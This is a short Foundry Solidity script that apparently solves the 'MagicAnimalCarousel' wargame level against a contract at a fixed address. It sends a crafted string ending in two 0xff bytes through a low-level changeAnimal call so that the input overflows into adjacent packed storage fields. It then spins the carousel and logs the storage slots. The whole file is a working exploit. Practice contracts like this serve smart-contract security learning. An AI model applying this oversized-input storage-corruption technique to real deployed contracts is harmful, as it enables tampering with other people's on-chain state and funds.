// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../src/MagicAnimalCarousel.sol";
import "forge-std/Script.sol";

contract MagicAnimalCarouselSol is Script {
    MagicAnimalCarousel public mac_ = MagicAnimalCarousel(0x499F769Ca545F3adAC42D8db78D41f3938a0165E);

    function run() external {
        vm.startBroadcast();

        mac_.setAnimalAndSpin("AAAAAAAAAAAA");
        console.logBytes32(bytes32(mac_.carousel(mac_.currentCrateId())));

        address(mac_).call(abi.encodeWithSignature("changeAnimal(string,uint256)", "AAAAAAAAAA\xff\xff", mac_.currentCrateId()));
        console.logBytes32(bytes32(mac_.carousel(mac_.currentCrateId())));

        mac_.setAnimalAndSpin("BBBBBBBBBBBB");
        console.logBytes32(bytes32(mac_.carousel(mac_.currentCrateId())));

        vm.stopBroadcast();
    }
}